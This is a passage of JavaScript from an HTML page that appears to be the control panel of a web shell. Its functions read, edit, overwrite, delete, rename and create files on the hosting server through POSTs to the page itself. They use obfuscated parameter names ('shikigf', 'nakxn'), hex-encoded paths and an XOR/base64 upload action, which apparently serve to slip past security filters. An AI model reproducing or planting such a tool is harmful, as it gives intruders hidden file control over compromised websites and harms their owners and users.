    document.getElementById('progressFill').style.width = '0%';
}

function closeUploadModal() {
    document.getElementById('uploadModal').style.display = 'none';
}

function uploadSelectedFiles() {
    const fileInput = document.getElementById('modalFileInput');
    if (fileInput.files.length > 0) {
        handleFileSelect(fileInput.files);
        closeUploadModal();
    }
}

function editFile(fileName) {
    const formData = new FormData();
    formData.append('shikigf', 'read');
    formData.append('nakxn', stringToHex(currentPath));
    formData.append('name', fileName);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            currentEditingFile = fileName;
            document.getElementById('editorTitle').textContent = `Edit: ${fileName}`;
            document.getElementById('editorContent').value = data.content;
            document.getElementById('editorModal').style.display = 'block';
        } else {
            showMessage('Error reading file: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function saveFile() {
    if (!currentEditingFile) return;
    
    const content = document.getElementById('editorContent').value;
    const formData = new FormData();
    formData.append('shikigf', 'save');
    formData.append('nakxn', stringToHex(currentPath));
    formData.append('name', currentEditingFile);
    // Use base64 encoding for the original XOR save function
    formData.append('content_b64', btoa(encodeURIComponent(content).replace(/%([0-9A-F]{2})/g, function(match, p1) {
        return String.fromCharCode('0x' + p1);
    })));
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            showMessage(`File "${currentEditingFile}" saved successfully`);
            closeEditorModal();
            refreshDir();
        } else {
            showMessage('Error saving file: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function closeEditorModal() {
    document.getElementById('editorModal').style.display = 'none';
    currentEditingFile = '';
}

function deleteItem(name) {
    if (!confirm(`Are you sure you want to delete "${name}"?`)) return;
    
    const formData = new FormData();
    formData.append('shikigf', 'delete');
    formData.append('nakxn', stringToHex(currentPath));
    formData.append('name', name);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            showMessage(`"${name}" deleted successfully`);
            refreshDir();
        } else {
            showMessage('Error deleting item: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function renameItem(oldName) {
    const newName = prompt(`Rename "${oldName}" to:`, oldName);
    if (!newName || newName === oldName) return;
    
    const formData = new FormData();
    formData.append('shikigf', 'rename');
    formData.append('nakxn', stringToHex(currentPath));
    formData.append('old', oldName);
    formData.append('new', newName);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            showMessage(`Renamed "${oldName}" to "${newName}"`);
            refreshDir();
        } else {
            showMessage('Error renaming item: ' + (data.error || 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function createNewFile() {
    const fileName = prompt('Enter new file name:');
    if (!fileName) return;
    
    const formData = new FormData();
    formData.append('shikigf', 'upload_xor');
    formData.append('nakxn', stringToHex(currentPath));
    formData.append('file_name', fileName);
    formData.append('file_content', '');
    formData.append('content_encoding', 'raw');
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.added && data.added.length > 0) {
            showMessage(data.notice || `File "${fileName}" created successfully`);
            refreshDir();
        } else {
            showMessage('Error creating file: ' + (data.error ? data.error.join(', ') : 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function createNewFolder() {
    const folderName = prompt('Enter new folder name:');
    if (!folderName) return;
    
    // Create folder by creating a hidden file inside it
    const formData = new FormData();
    formData.append('shikigf', 'upload_xor');
    formData.append('nakxn', stringToHex(currentPath));
    formData.append('file_name', folderName + '/.gitkeep');
    formData.append('file_content', '');
    formData.append('content_encoding', 'raw');
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.added && data.added.length > 0) {
            showMessage(`Folder "${folderName}" created successfully`);
            refreshDir();
        } else {
            showMessage('Error creating folder: ' + (data.error ? data.error.join(', ') : 'Unknown error'), 'error');
        }
    })
    .catch(error => {
        showMessage('Network error: ' + error.message, 'error');
    });
}

function filterFiles() {
    const searchTerm = document.getElementById('searchBox').value.toLowerCase();
    const rows = document.querySelectorAll('#fileTable tbody tr');
    
    rows.forEach(row => {
        const fileName = row.cells[0]?.textContent.toLowerCase() || '';
        row.style.display = fileName.includes(searchTerm) ? '' : 'none';
    });
}

function stringToHex(str) {
    let result = '';
    for (let i = 0; i < str.length; i++) {
        result += str.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return result;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Close modals when clicking outside
window.addEventListener('click', function(event) {
    const uploadModal = document.getElementById('uploadModal');
    const editorModal = document.getElementById('editorModal');
    
    if (event.target === uploadModal) {
        closeUploadModal();
    }
    if (event.target === editorModal) {
        closeEditorModal();
    }
});
</script>
</body>
</html>
